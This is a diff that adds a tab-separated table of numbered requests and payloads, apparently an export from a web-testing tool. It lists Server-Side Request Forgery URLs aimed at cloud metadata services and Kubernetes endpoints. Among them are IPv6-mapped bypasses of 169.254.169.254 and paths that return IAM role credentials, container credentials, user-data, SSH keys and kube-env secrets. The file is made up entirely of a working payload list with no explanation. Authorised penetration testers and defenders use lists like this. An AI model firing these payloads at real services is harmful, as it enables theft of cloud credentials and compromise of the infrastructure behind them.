@@ -1,0 +1,45 @@
+Request	Payload
+0	
+1	http://[::ffff:169.254.169.254]
+2	http://[0:0:0:0:0:ffff:169.254.169.254]
+3	http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+4	http://169.254.169.254/latest/user-data
+5	http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+6	http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+7	http://169.254.169.254/latest/meta-data/ami-id
+8	http://169.254.169.254/latest/meta-data/reservation-id
+9	http://169.254.169.254/latest/meta-data/hostname
+10	http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+11	http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+12	http://169.254.170.2/v2/credentials/
+13	http://169.254.169.254/computeMetadata/v1/
+14	http://metadata.google.internal/computeMetadata/v1/
+15	http://metadata/computeMetadata/v1/
+16	http://metadata.google.internal/computeMetadata/v1/instance/hostname
+17	http://metadata.google.internal/computeMetadata/v1/instance/id
+18	http://metadata.google.internal/computeMetadata/v1/project/project-id
+19	http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+20	http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+21	http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+22	http://169.254.169.254/metadata/v1.json
+23	http://169.254.169.254/metadata/v1/ 
+24	http://169.254.169.254/metadata/v1/id
+25	http://169.254.169.254/metadata/v1/user-data
+26	http://169.254.169.254/metadata/v1/hostname
+27	http://169.254.169.254/metadata/v1/region
+28	http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+29	https://metadata.packet.net/userdata
+30	http://169.254.169.254/metadata/instance?api-version=2017-04-02
+31	http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+32	http://169.254.169.254/opc/v1/instance/
+33	http://100.100.100.200/latest/meta-data/
+34	http://100.100.100.200/latest/meta-data/instance-id
+35	http://100.100.100.200/latest/meta-data/image-id
+36	http://169.254.169.254/openstack	 
+37	http://192.0.0.192/latest/
+38	http://192.0.0.192/latest/user-data/
+39	http://192.0.0.192/latest/meta-data/
+40	http://192.0.0.192/latest/attributes/
+41	https://kubernetes.default.svc.cluster.local
+42	https://kubernetes.default
+43	https://kubernetes.default.svc/metrics
